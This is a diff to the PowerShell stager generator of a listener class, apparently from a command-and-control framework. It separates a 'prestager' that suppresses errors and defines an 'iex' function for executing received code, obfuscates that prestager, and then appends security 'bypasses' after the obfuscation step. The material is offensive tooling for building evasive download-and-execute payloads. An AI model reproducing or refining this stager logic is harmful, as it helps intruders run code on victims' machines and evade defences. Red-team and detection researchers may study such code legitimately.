@@ -253,19 +253,19 @@ class Listener:
 
         if language == "powershell":
             # PowerShell
-            stager = '$ErrorActionPreference = "SilentlyContinue";'
-            stager += "function goForIT ($rdata) {iex $($rdata)};"
+            prestager = '$ErrorActionPreference = "SilentlyContinue";'
+            prestager += "function goForIT ($rdata) {iex $($rdata)};"
             
             if safeChecks.lower() == "true":
-                stager += "if(-not $PSVersionTable.PSVersion.Major -le 2 -and ($PSVersionTable.PSVersion.Major -eq 3 -or $PSVersionTable.PSVersion.Major -ge 4)){"
+                prestager += "if(-not $PSVersionTable.PSVersion.Major -le 2 -and ($PSVersionTable.PSVersion.Major -eq 3 -or $PSVersionTable.PSVersion.Major -ge 4)){"
 
-            for bypass in bypasses:
-                stager += bypass
+            #for bypass in bypasses:
+                #stager += bypass
 
             if safeChecks.lower() == "true":
-                stager += "}; [System.Net.ServicePointManager]::Expect100Continue=0;"
+                prestager += "}; [System.Net.ServicePointManager]::Expect100Continue=0;"
 
-            stager += "sleep(3);"
+            stager = "sleep(3);"
 
             if userAgent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
@@ -377,6 +377,15 @@ class Listener:
                     stager,
                     obfuscation_command=obfuscation_command,
                 )
+                prestager = self.mainMenu.obfuscationv2.obfuscate(
+                    prestager,
+                    obfuscation_command=obfuscation_command,
+                )
+            
+            for bypass in bypasses:
+                prestager += bypass
+                
+            stager = prestager + stager
 
             # base64 encode the stager and return it
             if encode and (
